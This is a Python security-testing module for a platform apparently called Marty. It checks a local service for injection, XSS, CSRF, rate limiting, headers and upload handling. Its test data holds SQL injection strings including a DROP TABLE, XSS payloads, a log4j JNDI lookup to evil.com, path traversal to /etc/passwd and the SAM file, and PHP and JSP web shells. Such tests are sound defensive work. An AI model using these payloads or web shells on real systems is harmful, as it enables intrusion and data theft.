"""
Security testing utilities for Marty Platform.

This module provides utilities for security testing including:
- Authentication testing
- Authorization testing
- Input validation testing
- Security configuration testing
- Vulnerability testing
"""

import asyncio
import base64
import hashlib
import hmac
import json
import time
from typing import Any, Dict, List, Optional, Tuple

import httpx
import pytest
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from jose import jwt


class SecurityTestFramework:
    """Framework for conducting security tests on Marty Platform services."""

    def __init__(self, base_url: str = "http://localhost:8080"):
        """Initialize the security test framework.

        Args:
            base_url: Base URL for the service under test
        """
        self.base_url = base_url.rstrip("/")
        self.client = httpx.AsyncClient(timeout=30.0)
        self.test_results: list[dict[str, Any]] = []

    async def __aenter__(self):
        """Async context manager entry."""
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        await self.client.aclose()

    def log_test_result(self, test_name: str, passed: bool, details: dict[str, Any]):
        """Log a test result.

        Args:
            test_name: Name of the test
            passed: Whether the test passed
            details: Additional test details
        """
        self.test_results.append(
            {"test_name": test_name, "passed": passed, "timestamp": time.time(), "details": details}
        )

    async def test_authentication_bypass(self) -> bool:
        """Test for authentication bypass vulnerabilities."""
        test_cases = [
            # Test without token
            {"headers": {}, "expected_status": 401},
            # Test with invalid token
            {"headers": {"Authorization": "Bearer invalid_token"}, "expected_status": 401},
            # Test with malformed token
            {"headers": {"Authorization": "Bearer"}, "expected_status": 401},
            # Test with expired token (if we can generate one)
            {
                "headers": {
                    "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MTYyMzkwMjJ9.invalid"
                },
                "expected_status": 401,
            },
        ]

        passed = True
        for i, test_case in enumerate(test_cases):
            try:
                response = await self.client.get(
                    f"{self.base_url}/protected-endpoint", headers=test_case["headers"]
                )
                if response.status_code != test_case["expected_status"]:
                    passed = False
                    self.log_test_result(
                        f"auth_bypass_test_{i}",
                        False,
                        {
                            "expected_status": test_case["expected_status"],
                            "actual_status": response.status_code,
                            "headers": test_case["headers"],
                        },
                    )
            except Exception as e:
                passed = False
                self.log_test_result(
                    f"auth_bypass_test_{i}",
                    False,
                    {"error": str(e), "headers": test_case["headers"]},
                )

        return passed

    async def test_sql_injection(self, endpoint: str = "/api/search") -> bool:
        """Test for SQL injection vulnerabilities.

        Args:
            endpoint: Endpoint to test for SQL injection

        Returns:
            True if no vulnerabilities found
        """
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null--",
            "'; DROP TABLE users--",
            "1' AND SLEEP(5)--",
            "' OR SUBSTRING(@@version,1,1)='5'--",
        ]

        passed = True
        for payload in sql_payloads:
            try:
                response = await self.client.get(
                    f"{self.base_url}{endpoint}", params={"q": payload}
                )

                # Check for SQL error messages
                error_indicators = [
                    "sql",
                    "mysql",
                    "postgresql",
                    "sqlite",
                    "oracle",
                    "syntax error",
                    "mysql_fetch",
                    "ORA-",
                    "SQLSTATE",
                ]

                response_text = response.text.lower()
                for indicator in error_indicators:
                    if indicator in response_text:
                        passed = False
                        self.log_test_result(
                            "sql_injection_test",
                            False,
                            {
                                "payload": payload,
                                "error_indicator": indicator,
                                "response_snippet": response_text[:200],
                            },
                        )
                        break

            except Exception as e:
                self.log_test_result(
                    "sql_injection_test", False, {"payload": payload, "error": str(e)}
                )

        return passed

    async def test_xss_vulnerability(self, endpoint: str = "/api/echo") -> bool:
        """Test for Cross-Site Scripting (XSS) vulnerabilities.

        Args:
            endpoint: Endpoint to test for XSS

        Returns:
            True if no vulnerabilities found
        """
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
        ]

        passed = True
        for payload in xss_payloads:
            try:
                response = await self.client.post(
                    f"{self.base_url}{endpoint}", json={"data": payload}
                )

                # Check if payload is reflected without proper escaping
                if payload in response.text:
                    passed = False
                    self.log_test_result(
                        "xss_test",
                        False,
                        {
                            "payload": payload,
                            "reflected": True,
                            "response_snippet": response.text[:200],
                        },
                    )

            except Exception as e:
                self.log_test_result("xss_test", False, {"payload": payload, "error": str(e)})

        return passed

    async def test_csrf_protection(self, endpoint: str = "/api/update") -> bool:
        """Test for Cross-Site Request Forgery (CSRF) protection.

        Args:
            endpoint: Endpoint to test for CSRF protection

        Returns:
            True if CSRF protection is properly implemented
        """
        try:
            # Test without CSRF token
            response = await self.client.post(
                f"{self.base_url}{endpoint}",
                json={"action": "test"},
                headers={"Origin": "http://malicious-site.com"},
            )

            # Should be rejected due to missing CSRF token or invalid origin
            if response.status_code == 200:
                self.log_test_result(
                    "csrf_test",
                    False,
                    {
                        "issue": "Request accepted without CSRF protection",
                        "status_code": response.status_code,
                    },
                )
                return False

            return True

        except Exception as e:
            self.log_test_result("csrf_test", False, {"error": str(e)})
            return False

    async def test_rate_limiting(self, endpoint: str = "/api/login") -> bool:
        """Test rate limiting implementation.

        Args:
            endpoint: Endpoint to test for rate limiting

        Returns:
            True if rate limiting is properly implemented
        """
        try:
            # Send multiple requests rapidly
            responses = []
            for i in range(10):
                response = await self.client.post(
                    f"{self.base_url}{endpoint}",
                    json={"username": f"test{i}", "password": "invalid"},
                )
                responses.append(response.status_code)

            # Check if any requests were rate limited (429 status)
            rate_limited = any(status == 429 for status in responses)

            if not rate_limited:
                self.log_test_result(
                    "rate_limiting_test",
                    False,
                    {"issue": "No rate limiting detected", "response_codes": responses},
                )
                return False

            return True

        except Exception as e:
            self.log_test_result("rate_limiting_test", False, {"error": str(e)})
            return False

    async def test_security_headers(self) -> bool:
        """Test for proper security headers.

        Returns:
            True if all required security headers are present
        """
        required_headers = {
            "Content-Security-Policy": "Content Security Policy",
            "Strict-Transport-Security": "HTTP Strict Transport Security",
            "X-Frame-Options": "X-Frame-Options",
            "X-Content-Type-Options": "X-Content-Type-Options",
            "X-XSS-Protection": "X-XSS-Protection",
        }

        try:
            response = await self.client.get(f"{self.base_url}/")

            missing_headers = []
            for header, description in required_headers.items():
                if header not in response.headers:
                    missing_headers.append(header)

            if missing_headers:
                self.log_test_result(
                    "security_headers_test",
                    False,
                    {
                        "missing_headers": missing_headers,
                        "present_headers": list(response.headers.keys()),
                    },
                )
                return False

            return True

        except Exception as e:
            self.log_test_result("security_headers_test", False, {"error": str(e)})
            return False

    async def test_input_validation(self, endpoint: str = "/api/validate") -> bool:
        """Test input validation and sanitization.

        Args:
            endpoint: Endpoint to test input validation

        Returns:
            True if input validation is properly implemented
        """
        test_inputs = [
            # Boundary value testing
            {"data": "a" * 10000, "type": "oversized_input"},
            {"data": "", "type": "empty_input"},
            {"data": None, "type": "null_input"},
            # Special character testing
            {"data": "!@#$%^&*()", "type": "special_chars"},
            {"data": "../../etc/passwd", "type": "path_traversal"},
            {"data": "\\x00\\x01\\x02", "type": "control_chars"},
            # Format string testing
            {"data": "%s%s%s%s", "type": "format_string"},
            {"data": "${jndi:ldap://evil.com/a}", "type": "log4j_injection"},
        ]

        passed = True
        for test_input in test_inputs:
            try:
                response = await self.client.post(f"{self.base_url}{endpoint}", json=test_input)

                # Check for error responses indicating proper validation
                if response.status_code not in [400, 422]:
                    passed = False
                    self.log_test_result(
                        "input_validation_test",
                        False,
                        {
                            "input_type": test_input["type"],
                            "input_data": str(test_input["data"])[:100],
                            "status_code": response.status_code,
                            "expected": "400 or 422 (validation error)",
                        },
                    )

            except Exception as e:
                self.log_test_result(
                    "input_validation_test",
                    False,
                    {"input_type": test_input["type"], "error": str(e)},
                )

        return passed

    async def test_file_upload_security(self, endpoint: str = "/api/upload") -> bool:
        """Test file upload security measures.

        Args:
            endpoint: File upload endpoint to test

        Returns:
            True if file upload security is properly implemented
        """
        test_files = [
            # Malicious file types
            {"filename": "malware.exe", "content": b"MZ\x90\x00", "type": "executable"},
            {
                "filename": "script.php",
                "content": b"<?php system($_GET['cmd']); ?>",
                "type": "script",
            },
            {
                "filename": "test.jsp",
                "content": b"<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>",
                "type": "jsp",
            },
            # Path traversal in filename
            {"filename": "../../../etc/passwd", "content": b"test", "type": "path_traversal"},
            {
                "filename": "..\\..\\windows\\system32\\config\\sam",
                "content": b"test",
                "type": "windows_path_traversal",
            },
            # Oversized files
            {"filename": "large.txt", "content": b"A" * (10 * 1024 * 1024), "type": "oversized"},
        ]

        passed = True
        for test_file in test_files:
            try:
                files = {"file": (test_file["filename"], test_file["content"])}
                response = await self.client.post(f"{self.base_url}{endpoint}", files=files)

                # Should reject malicious files
                if response.status_code == 200:
                    passed = False
                    self.log_test_result(
                        "file_upload_security_test",
                        False,
                        {
                            "file_type": test_file["type"],
                            "filename": test_file["filename"],
                            "issue": "Malicious file accepted",
                        },
                    )

            except Exception as e:
                self.log_test_result(
                    "file_upload_security_test",
                    False,
                    {"file_type": test_file["type"], "error": str(e)},
                )

        return passed

    async def run_comprehensive_security_test(self) -> dict[str, Any]:
        """Run a comprehensive security test suite.

        Returns:
            Dictionary containing test results and summary
        """
        print("🛡️ Starting comprehensive security testing...")

        tests = [
            ("Authentication Bypass", self.test_authentication_bypass()),
            ("SQL Injection", self.test_sql_injection()),
            ("XSS Vulnerability", self.test_xss_vulnerability()),
            ("CSRF Protection", self.test_csrf_protection()),
            ("Rate Limiting", self.test_rate_limiting()),
            ("Security Headers", self.test_security_headers()),
            ("Input Validation", self.test_input_validation()),
            ("File Upload Security", self.test_file_upload_security()),
        ]

        results = {}
        for test_name, test_coro in tests:
            print(f"Running {test_name} test...")
            try:
                result = await test_coro
                results[test_name] = result
                status = "✅ PASS" if result else "❌ FAIL"
                print(f"{test_name}: {status}")
            except Exception as e:
                results[test_name] = False
                print(f"{test_name}: ❌ ERROR - {str(e)}")

        # Generate summary
        total_tests = len(results)
        passed_tests = sum(1 for result in results.values() if result)
        failed_tests = total_tests - passed_tests

        summary = {
            "total_tests": total_tests,
            "passed_tests": passed_tests,
            "failed_tests": failed_tests,
            "success_rate": (passed_tests / total_tests) * 100,
            "test_results": results,
            "detailed_results": self.test_results,
        }

        print(f"\n📊 Security Testing Summary:")
        print(f"Total Tests: {total_tests}")
        print(f"Passed: {passed_tests}")
        print(f"Failed: {failed_tests}")
        print(f"Success Rate: {summary['success_rate']:.1f}%")

        return summary


class CryptographyTestUtils:
    """Utilities for testing cryptographic implementations."""

    @staticmethod
    def generate_test_key_pair() -> tuple[bytes, bytes]:
        """Generate a test RSA key pair.

        Returns:
            Tuple of (private_key_pem, public_key_pem)
        """
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        )

        public_key = private_key.public_key()
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )

        return private_pem, public_pem

    @staticmethod
    def test_jwt_security(secret: str = "test_secret") -> dict[str, Any]:
        """Test JWT implementation security.

        Args:
            secret: JWT secret for testing

        Returns:
            Dictionary with test results
        """
        results = {}

        # Test 1: Verify algorithm confusion
        try:
            payload = {"user": "test", "exp": int(time.time()) + 3600}

            # Create token with HS256
            token_hs256 = jwt.encode(payload, secret, algorithm="HS256")

            # Try to verify with none algorithm (should fail)
            try:
                jwt.decode(token_hs256, secret, algorithms=["none"])
                results["algorithm_confusion"] = False
            except:
                results["algorithm_confusion"] = True

        except Exception as e:
            results["algorithm_confusion"] = f"Error: {str(e)}"

        # Test 2: Verify token expiration
        try:
            expired_payload = {"user": "test", "exp": int(time.time()) - 3600}
            expired_token = jwt.encode(expired_payload, secret, algorithm="HS256")

            try:
                jwt.decode(expired_token, secret, algorithms=["HS256"])
                results["expiration_check"] = False
            except jwt.ExpiredSignatureError:
                results["expiration_check"] = True
            except Exception:
                results["expiration_check"] = False

        except Exception as e:
            results["expiration_check"] = f"Error: {str(e)}"

        return results

    @staticmethod
    def test_encryption_strength(data: bytes = b"test_data") -> dict[str, Any]:
        """Test encryption implementation strength.

        Args:
            data: Test data to encrypt

        Returns:
            Dictionary with test results
        """
        results = {}

        # Test AES encryption
        try:
            key = Fernet.generate_key()
            fernet = Fernet(key)

            encrypted = fernet.encrypt(data)
            decrypted = fernet.decrypt(encrypted)

            results["aes_encryption"] = decrypted == data
            results["encrypted_different"] = encrypted != data

        except Exception as e:
            results["aes_encryption"] = f"Error: {str(e)}"

        # Test key derivation
        try:
            password = b"test_password"
            salt = b"test_salt_16_bytes"

            # Test PBKDF2
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )

            key1 = kdf.derive(password)

            # Should produce same key with same inputs
            kdf2 = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key2 = kdf2.derive(password)

            results["key_derivation"] = key1 == key2

        except Exception as e:
            results["key_derivation"] = f"Error: {str(e)}"

        return results


# Pytest fixtures and test functions
@pytest.fixture
async def security_framework():
    """Pytest fixture for security test framework."""
    async with SecurityTestFramework() as framework:
        yield framework


@pytest.mark.security
@pytest.mark.asyncio
async def test_authentication_security(security_framework):
    """Test authentication security."""
    result = await security_framework.test_authentication_bypass()
    assert result, "Authentication bypass vulnerabilities detected"


@pytest.mark.security
@pytest.mark.asyncio
async def test_injection_vulnerabilities(security_framework):
    """Test for injection vulnerabilities."""
    sql_result = await security_framework.test_sql_injection()
    xss_result = await security_framework.test_xss_vulnerability()

    assert sql_result, "SQL injection vulnerabilities detected"
    assert xss_result, "XSS vulnerabilities detected"


@pytest.mark.security
@pytest.mark.asyncio
async def test_security_headers(security_framework):
    """Test security headers implementation."""
    result = await security_framework.test_security_headers()
    assert result, "Required security headers missing"


@pytest.mark.security
def test_cryptography_implementations():
    """Test cryptographic implementations."""
    crypto_utils = CryptographyTestUtils()

    # Test JWT security
    jwt_results = crypto_utils.test_jwt_security()
    assert jwt_results.get("algorithm_confusion") is True, "JWT algorithm confusion vulnerability"
    assert jwt_results.get("expiration_check") is True, "JWT expiration not properly checked"

    # Test encryption strength
    encryption_results = crypto_utils.test_encryption_strength()
    assert encryption_results.get("aes_encryption") is True, "AES encryption failed"
    assert encryption_results.get("key_derivation") is True, "Key derivation failed"


if __name__ == "__main__":
    # Run comprehensive security test
    async def main():
        async with SecurityTestFramework() as framework:
            results = await framework.run_comprehensive_security_test()

            # Save results to file
            with open("reports/security/security_test_results.json", "w") as f:
                json.dump(results, f, indent=2, default=str)

            print(f"\n📁 Results saved to: reports/security/security_test_results.json")

    # Run the security tests
    asyncio.run(main())
